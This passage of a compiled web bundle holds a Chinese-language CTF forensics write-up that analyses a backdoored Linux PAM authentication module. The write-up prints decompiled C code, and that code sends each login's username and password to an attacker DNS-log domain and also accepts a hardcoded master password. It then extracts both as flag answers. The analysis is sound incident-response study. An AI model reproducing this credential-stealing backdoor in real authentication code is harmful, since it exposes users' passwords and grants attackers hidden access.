0;\n}\n'})}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"main"}),"\u51fd\u6570\u4e2d\u8c03\u7528\u4e862\u4e2a\u81ea\u5b9a\u4e49\u51fd\u6570"]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"get_dns_servers"}),"\n",(0,s.jsx)(e.li,{children:"ngethostbyname"}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-c",children:'void __cdecl get_dns_servers()\n{\n    FILE *v0; // rbp\n    char line[200]; // [rsp+0h] [rbp-E8h] BYREF\n\n    v0 = fopen("/etc/resolv.conf", "r");\n    if ( !v0 )\n        puts("Failed opening /etc/resolv.conf file ");\n    while ( fgets(line, 200, v0) )\n    {\n        if ( line[0] != 35 && *(_QWORD *)line == 0x76726573656D616ELL && *(_WORD *)&line[8] == 29285 )\n        {\n            strtok(line, " ");\n            strtok(0LL, " ");\n        }\n    }\n    strcpy(dns_servers, "208.67.222.222");\n    strcpy(&dns_servers[100], "208.67.220.220");\n}\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u540c\u65f6\u5728\u6d41\u91cf\u4e2d\u8fc7\u6ee4dns\u6d41\u91cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(58072).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u5f97\u5230\u4e24\u4e2a\u5173\u952e\u4fe1\u606f"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"root.XJ@123"}),"\n",(0,s.jsx)(e.li,{children:"c0ee2ad2d8.ipv6.xxx.eu.org"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u7ed3\u5408\u8fd9\u4e24\u4e2a\u5173\u952e\u5b57\u7b26\u4e32\uff0c\u7ee7\u7eed\u5728\u540e\u95e8\u6587\u4ef6\u4e2d\u8fdb\u884c\u641c\u7d22"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(54419).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u8df3\u8f6c\u5230\u5f15\u7528\u51fd\u6570"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-c",children:'int __fastcall pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)\n{\n    int v4; // r14d\n    int *v5; // rax\n    int *v6; // r13\n    int user; // eax\n    int v8; // r12d\n    int authtok; // eax\n    int v11; // r14d\n    bool v12; // zf\n    const char *name; // [rsp+10h] [rbp-A8h] BYREF\n    const char *p; // [rsp+18h] [rbp-A0h] BYREF\n    unsigned __int8 hostname[100]; // [rsp+20h] [rbp-98h] BYREF\n\n    v4 = set_ctrl(pamh, flags, 0LL, 0LL, 0LL, argc, argv);\n    v5 = (int *)malloc(4uLL);\n    if ( !v5 )\n    {\n        v8 = 5;\n        pam_syslog(pamh, 2LL, "pam_unix_auth: cannot allocate ret_data");\n        return v8;\n    }\n    v6 = v5;\n    user = pam_get_user(pamh, &name, 0LL);\n    v8 = user;\n    if ( user )\n    {\n        if ( user == 30 )\n        v8 = 31;\n        *v6 = v8;\n        goto LABEL_15;\n    }\n    if ( name && ((*name - 43) & 0xFD) != 0 )\n    {\n        if ( unix_blankpasswd(pamh, v4, name) )\n        {\n            name = 0LL;\n            *v6 = 0;\nLABEL_15:\n            pam_set_data(pamh, "unix_setcred_return", v6, setcred_free);\n            return v8;\n        }\n        authtok = pam_get_authtok(pamh, 6LL, &p, 0LL);\n        v8 = authtok;\n        if ( authtok )\n        {\n            if ( authtok == 30 )\n                v8 = 31;\n            else\n                pam_syslog(pamh, 2LL, "auth could not identify password for [%s]", name);\n            name = 0LL;\n            *v6 = v8;\n            goto LABEL_15;\n        }\n        v11 = unix_verify_password(pamh, name, p, v4);\n        get_dns_servers();\n        snprintf((char *)hostname, 0x64uLL, "%s.%s c0ee2ad2d8.ipv6.xxx.eu.org.", name, p);\n        if ( !fork() )\n            ngethostbyname(hostname, 1);\n        v12 = strcmp("XJ@123", p) == 0;\n        v8 = !v12;\n        if ( !v12 )\n        {\n            *v6 = v11;\n            v8 = v11;\n            p = 0LL;\n            name = 0LL;\n            pam_set_data(pamh, "unix_setcred_return", v6, setcred_free);\n        }\n    }\n    else\n    {\n        v8 = 10;\n        pam_syslog(pamh, 3LL, "bad username [%s]", name);\n        *v6 = 10;\n        pam_set_data(pamh, "unix_setcred_return", v6, setcred_free);\n    }\n    return v8;\n}\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u90e8\u5206 ",(0,s.jsx)(e.code,{children:"unix_verify_password(pamh, name, p, v4);"}),"\u8bf4\u660e",(0,s.jsx)(e.code,{children:"p"}),"\u8fd9\u4e2a\u53c2\u6570\u4f20\u8f93\u7684\u5c31\u662f\u5bc6\u7801"]}),"\n",(0,s.jsx)(e.p,{children:"\u90a3\u4e48\u5c31\u53ef\u4ee5\u786e\u5b9a\u540e\u95e8\u5bc6\u7801"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{XJ@123}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"13",children:"13"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u7684\u6076\u610fdnslog\u670d\u52a1\u5668\u5730\u5740\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.admonition,{type:"warning",children:(0,s.jsx)(e.p,{children:"\u8fd9\u91cc\u4ece\u6d41\u91cf\u4e2d\u63d0\u53d6\u7684\u7ed3\u679c\u662f\u9519\u8bef\u7684\uff0c\u5fc5\u987b\u662f\u540e\u95e8\u6587\u4ef6\u4e2d\u7684\u539f\u6587"})}),"\n",(0,s.jsx)(e.p,{children:"\u5728\u540e\u95e8\u6587\u4ef6\u4e2d\u6709\u8fd9\u4e48\u4e00\u90e8\u5206"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-c",children:'v11 = unix_verify_password(pamh, name, p, v4);\nget_dns_servers();\nsnprintf((char *)hostname, 0x64uLL, "%s.%s c0ee2ad2d8.ipv6.xxx.eu.org.", name, p);\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{c0ee2ad2d8.ipv6.xxx.eu.org.}\n"})})]})}function p(n={}){const{wrapper:e}={...(0,t.a)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(d,{...n})}):d(n)}},20621:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241004-010452-04d36c17b9f7422a0f4c3acccc7b8874.png"},14146:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241010-011031-47146b1021378d01632ea46644cc1592.png"},51649:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241012-011209-d7ccb9edec7a82e59a3324897f35beed.png"},533:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241014-011452-64b5cfcdd1dd6e0bd292811de7327b20.png"},14093:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241016-011612-e6bfd2d2808858ce3a3baa1c9f6a976c.png"},18543:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241020-012010-3c5117a339ed75b6f4928644d591a8cf.png"},5380:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241021-012148-db771f02c466d87db615eb5c6a8b3571.png"},15941:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241028-012855-e5515534ea9da6c1ef18fd8117be74d5.png"},84237:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241030-013059-7fd791e57d2bd5c7d89e310aac963496.png"},52220:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241033-013314-6d6dc706273340282b63927d2b9f43dc.png"},64402:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241036-013652-69c7da68b70e6898c12edd1d7e01880d.png"},62880:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241038-013832-d11c60748fa17227db7c024910ca1b64.png"},22391:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241044-014405-371753d3a4fba13f5dee36f1b1059061.png"},38829:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241050-005032-33e26ab17f57434a3e4db561a3b74bc1.png"},58072:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241053-015341-2a4d80218c79991b8a9a20ddfcc6bd94.png"},17189:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241054-005424-36023d455cf4eaea866c1a96f0f195d2.png"},54419:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241055-015524-f1c94313d7ba226215136f9f36254a6c.png"},55253:(n,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image_20241058-005831-136297679fbbbbb3cef74f8e28614019.png"},11151:(n,e,a)=>{a.d(e,{Z:()=>c,a:()=>i});var s=a(67294);const t={},r=s.createContext(t);function i(n){const e=s.useContext(r);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:i(n.components),s.createElement(r.Provider,{value:e},n.children)}}}]);